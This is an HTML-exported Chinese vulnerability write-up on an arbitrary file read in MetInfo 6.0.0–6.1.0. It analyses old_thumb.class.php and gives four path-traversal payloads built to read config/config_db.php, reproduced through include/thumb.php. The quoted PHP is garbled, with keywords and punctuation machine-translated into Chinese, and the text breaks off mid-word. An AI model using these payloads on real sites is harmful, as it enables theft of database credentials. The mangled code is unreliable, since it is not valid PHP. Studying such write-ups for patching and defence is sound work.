<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="metinfo-任意文件读取"><span class="csDE05BCC">MetInfo </span><span class="csECDA2D3">任意文件读取</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">MetInfo</span><span class="cs9C1B1871">是一套使用</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Mysql</span><span class="cs9C1B1871">开发的内容管理系统。</span><span class="cs8926E06"> MetInfo 6.0.0~6.1.0</span><span class="cs9C1B1871">版本中的</span><span class="cs8926E06"> old_thumb.class.php</span><span class="cs9C1B1871">文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">MetInfo 6.0.0 MetInfo 6.1.0</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">进攻分析</span><span class="cs8926E06"> </span><span class="cs9C1B1871">看下</span><span class="cs8926E06">\MetInfo6\app\system\include\module\old_thumb.class.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;</span><span class="cs7FFD2630">？</span><span class="cs9FB05234">php </span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">＃</span><span class="cs9FB05234">MetInfo</span><span class="cs7FFD2630">企业内容管理系统</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">＃版权所有（</span><span class="cs9FB05234">C</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">MetInfo Co.</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">Ltd</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">http://www.metinfo.cn</span><span class="cs7FFD2630">）。版权所有。</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">define</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;IN_MET&#39;</span><span class="cs7FFD2630">）或</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">退出（</span><span class="cs9FB05234">&#39;No</span><span class="cs7FFD2630">权限</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">load :: sys_class</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;web&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class &nbsp;old_thumb &nbsp;</span><span class="cs7FFD2630">扩展了</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">网络</span><span class="cs9FB05234"> {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">公共</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">功能</span><span class="cs9FB05234"> doshow </span><span class="cs7FFD2630">（）</span><span class="cs9FB05234"> { </span><span class="cs7FFD2630">全局</span><span class="cs9FB05234"> $ _M;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ DIR = str_replace</span><span class="cs7FFD2630">函数（</span><span class="cs9FB05234">&#39;../&#39; </span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ _GET [ &#39;</span><span class="cs7FFD2630">目录</span><span class="cs9FB05234">&#39; ]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">strstr</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">str_replace</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _ M [ &#39;url&#39; ] [ &#39;site&#39; ]</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ dir</span><span class="cs7FFD2630">），</span><span class="cs9FB05234">&#39;http&#39;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; Content-type</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">image / jpeg&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ob_start</span><span class="cs7FFD2630">（）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;readfile</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ dir</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ob_flush</span><span class="cs7FFD2630">（）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flush</span><span class="cs7FFD2630">（）</span><span class="cs9FB05234">; </span><span class="cs7FFD2630">死</span><span class="cs9FB05234"> ; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _M [ &#39;form&#39; ] [ &#39;pageset&#39; ]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ path = $ dir</span><span class="cs7FFD2630">。</span><span class="cs9FB05234">&ldquo;</span><span class="cs7FFD2630">＆</span><span class="cs9FB05234">met-table = {$ _ M [&#39;form&#39;] [&#39;met-table&#39;]}</span><span class="cs7FFD2630">＆</span><span class="cs9FB05234">met-field = {$ _ M [&#39;form&#39;] [&#39;met-field&#39;]}&rdquo;&ldquo;</span><span class="cs7FFD2630">；</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else { </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ path = $ dir; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ image = thumb</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ path</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ _ M [ &#39;form&#39; ] [ &#39;x&#39; ]</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ _ M [ &#39;form&#39; ] [ &#39;y&#39; ]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _M [ &#39;form&#39; ] [ &#39;pageset&#39; ]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ img = explode</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">？</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ image</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ img = $ img [ 0 ]; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ img = $ image; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ img</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; Content-type</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">image / jpeg&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ob_start</span><span class="cs7FFD2630">（）</span><span class="cs9FB05234">;</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;readfile</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">PATH_WEB.str_replace</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _ M [ &#39;url&#39; ] [ &#39;site&#39; ]</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ img</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ob_flush</span><span class="cs7FFD2630">（）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flush</span><span class="cs7FFD2630">（）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">＃此程序是一个开放源代码系统，可用于商业用途，请自觉购买商业许可证。</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">＃版权所有（</span><span class="cs9FB05234">C</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">MetInfo Co.</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">Ltd.</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">http://www.metinfo.cn</span><span class="cs7FFD2630">）。版权所有。</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">？</span><span class="cs9FB05234">&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从代码中看用看到，</span><span class="cs8926E06">$dir</span><span class="cs9C1B1871">直接由</span><span class="cs8926E06">$_GET[&#39;dir&#39;]</span><span class="cs9C1B1871">传递进来，并将</span><span class="cs8926E06">../</span><span class="cs9C1B1871">置空。目标是进入到第一个，如果里面的</span><span class="cs8926E06">readfile($dir);</span><span class="cs9C1B1871">，读取文件。看看如果语句的条件，的英文外面一个</span><span class="cs8926E06">strstr</span><span class="cs9C1B1871">函数，判断</span><span class="cs8926E06">$dir</span><span class="cs9C1B1871">中</span><span class="cs8926E06">http</span><span class="cs9C1B1871">字符串的首次出现位置，实质上，要进入到这个</span><span class="cs8926E06">if</span><span class="cs9C1B1871">语句里面，</span><span class="cs8926E06">$dir</span><span class="cs9C1B1871">中必须包含</span><span class="cs8926E06">http</span><span class="cs9C1B1871">字符串。里面的将</span><span class="cs8926E06">$dir</span><span class="cs9C1B1871">中包含</span><span class="cs8926E06">$_M[&#39;url&#39;][&#39;site&#39;]</span><span class="cs9C1B1871">的部分放置空，这里可以不用管。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/MetInfo/Metinfo%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96_files/image0.png" width="560" height="309" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从上面的分析可以构造出有效负载，只要</span><span class="cs8926E06">$dir</span><span class="cs9C1B1871">里包含</span><span class="cs8926E06">http</span><span class="cs9C1B1871">字符串就可以进入到</span><span class="cs8926E06">readfile</span><span class="cs9C1B1871">函数从而重新读取任意函数，然后可以使用</span><span class="cs8926E06">..././</span><span class="cs9C1B1871">来进行目录替换，因为</span><span class="cs8926E06">../</span><span class="cs9C1B1871">会被置空，所以最终</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">?dir=..././http/..././config/config_db.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">?dir=.....///http/.....///config/config_db.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">?dir=http/.....///.....///config/config_db.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">?dir=http\..\..\config\config_db.php</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">要先找到调用</span><span class="cs8926E06">old_thumb.class.php</span><span class="cs9C1B1871">的文件，看到</span><span class="cs8926E06">include/thumb.php</span><span class="cs9C1B1871">，可以从这个文件里面进入到</span><span class="cs8926E06">old_thumb.class.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># MetInfo Enterprise Content Management System</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;M_NAME&#39;, &#39;include&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;M_MODULE&#39;, &#39;include&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;M_CLASS&#39;, &#39;old_thumb&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;M_ACTION&#39;, &#39;doshow&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">require_once &#39;../app/system/entrance.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以我们通过</span><span class="cs8926E06">thumb.php</span><span class="cs9C1B1871">将构造好的</span><span class="cs8926E06">$dir</span><span class="cs9C1B1871">传入即可。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/MetInfo/Metinfo%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96_files/image1.png" width="560" height="202" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到成功的读取到了</span><span class="cs8926E06">config/config_</span></p></body>
</html>
